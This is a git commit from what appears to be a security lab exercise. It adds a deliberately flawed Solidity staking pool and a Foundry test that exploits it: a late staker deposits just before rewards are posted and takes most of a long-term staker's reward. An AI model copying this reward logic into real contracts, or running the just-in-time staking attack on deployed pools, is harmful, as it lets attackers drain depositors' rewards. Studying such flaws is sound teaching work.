f97ea1be3a158c889613a6be06a0c3b94231c8e2
void-node <275939269+void-node@users.noreply.github.com>
2026-05-18 16:37:11 +0000

    feat: Lab 10 - add staking pool exploit code

---
+++ src/StakingPool.sol
@@ -0,0 +1,54 @@
+// SPDX-Licence-Identifier: MIT
+pragma solidity ^0.8.28;
+
+contract StakingPool {
+    uint256 public totalStaked;
+    uint256 public rewardPerTokenStored;
+
+    mapping(address => uint256) public balanceOf;
+    mapping(address => uint256) public rewardsOf;
+    mapping(address => uint256) public userRewardPerTokenPaid;
+
+    modifier updateReward(address _account) {
+        rewardPerTokenStored = rewardPerToken();
+        if (_account != address(0)) {
+            rewardsOf[_account] = earned(_account);
+            userRewardPerTokenPaid[_account] = rewardPerTokenStored;
+        }
+        _;
+    }
+    function rewardPerToken() public view returns (uint256) {
+        if (totalStaked == 0) {
+            return rewardPerTokenStored;
+        }
+        return rewardPerTokenStored;
+    }
+    function earned(address _account) public view returns (uint256) {
+        return ((balanceOf[_account] * (rewardPerToken() - userRewardPerTokenPaid[_account])) / 1e18) + rewardsOf[_account];
+    }
+    function stake() public payable updateReward(msg.sender) {
+        require(msg.value > 0, "Zero stake");
+        balanceOf[msg.sender] += msg.value;
+        totalStaked += msg.value;
+    }
+    function withdraw(uint256 _amount) public updateReward(msg.sender) {
+        require(balanceOf[msg.sender] >= _amount, "Low balance");
+        balanceOf[msg.sender] -= _amount;
+        totalStaked -= _amount;
+        payable(msg.sender).transfer(_amount);
+    }
+    function getReward() public updateReward(msg.sender) {
+        uint256 reward = rewardsOf[msg.sender];
+        if (reward > 0) {
+            rewardsOf[msg.sender] = 0;
+            payable(msg.sender).transfer(reward);
+        }
+    }
+    function notifyRewardAmount() public payable updateReward(address(0)) {
+        require(msg.value > 0, "Zero reward");
+        if (totalStaked > 0) {
+            rewardPerTokenStored += (msg.value * 1e18) / totalStaked;
+        }
+    }
+    receive() external payable {}
+}
---
+++ test/StakingPoolTest.t.sol
@@ -0,0 +1,34 @@
+// SPDX-Licence-Identifier: MIT
+pragma solidity ^0.8.28;
+
+import "forge-std/Test.sol";
+import "../src/StakingPool.sol";
+
+contract StakingPoolTest is Test {
+    StakingPool public pool;
+
+    address public alice = address(0xA11C3);
+    address public hacker = address(0x1337);
+
+    function setUp() public {
+        pool = new StakingPool();
+
+        vm.deal(alice, 10 ether);
+        vm.deal(hacker, 90 ether);
+        vm.deal(address(this), 100 ether);
+    }
+    function testAttack() public {
+        vm.prank(alice);
+        pool.stake{value: 10 ether}();
+        vm.warp(block.timestamp + 7 days);
+        vm.prank(hacker);
+        pool.stake{value: 90 ether}();
+        pool.notifyRewardAmount{value: 10 ether}();
+        vm.startPrank(hacker);
+        pool.getReward();
+        pool.withdraw(90 ether);
+        vm.stopPrank();
+        assertEq(hacker.balance, 99 ether);
+        console.log("Alice rewards earned:", pool.earned(alice));
+    }
+}
